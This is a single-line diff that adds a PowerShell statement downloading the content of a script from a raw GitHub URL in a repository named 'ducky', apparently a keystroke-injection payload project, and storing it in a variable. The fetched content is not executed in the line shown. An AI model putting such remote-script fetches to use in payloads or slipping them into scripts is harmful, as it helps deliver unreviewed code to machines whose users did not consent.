@@ -1,0 +1,1 @@
+$previous = (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/http/script).content
